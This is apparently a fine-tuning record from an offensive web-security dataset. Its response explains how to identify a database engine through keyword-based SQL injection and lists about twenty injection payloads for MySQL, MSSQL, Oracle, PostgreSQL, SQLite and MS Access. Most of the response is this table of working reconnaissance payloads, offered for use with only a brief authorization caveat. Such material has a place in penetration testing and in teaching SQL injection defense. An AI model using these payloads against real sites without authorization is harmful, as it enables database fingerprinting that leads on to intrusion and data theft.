# SQLI — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: sqli
- cwe: CWE-89

## Scenario

Help me understand DBMS Identification Keyword Based as it relates to SQL Injection, with the payloads from the field.

## Analysis / Response

**DBMS Identification Keyword Based** — this technique applies to SQL Injection. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

Certain SQL keywords are specific to particular database management systems (DBMS). By using these keywords in SQL injection attempts and observing how the website responds, you can often determine the type of DBMS in use.

| DBMS       | SQL Payload                                       |
| ---------- | ------------------------------------------------- |
| MySQL      | `conv('a',16,2)=conv('a',16,2)`                   |
| MySQL      | `connection_id()=connection_id()`                 |
| MySQL      | `crc32('MySQL')=crc32('MySQL')`                   |
| MSSQL      | `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)`       |
| MSSQL      | `@@CONNECTIONS>0`                                 |
| MSSQL      | `@@CONNECTIONS=@@CONNECTIONS`                     |
| MSSQL      | `@@CPU_BUSY=@@CPU_BUSY`                           |
| MSSQL      | `USER_ID(1)=USER_ID(1)`                           |
| ORACLE     | `ROWNUM=ROWNUM`                                   |
| ORACLE     | `RAWTOHEX('AB')=RAWTOHEX('AB')`                   |
| ORACLE     | `LNNVL(0=123)`                                    |
| POSTGRESQL | `5::int=5`                                        |
| POSTGRESQL | `5::integer=5`                                    |
| POSTGRESQL | `pg_client_encoding()=pg_client_encoding()`       |
| POSTGRESQL | `get_current_ts_config()=get_current_ts_config()` |
| POSTGRESQL | `quote_literal(42.5)=quote_literal(42.5)`         |
| POSTGRESQL | `current_database()=current_database()`           |
| SQLITE     | `sqlite_version()=sqlite_version()`               |
| SQLITE     | `last_insert_rowid()>1`                           |
| SQLITE     | `last_insert_rowid()=last_insert_rowid()`         |
| MSACCESS   | `val(cvar(1))=1`                                  |
| MSACCESS   | `IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0`               |
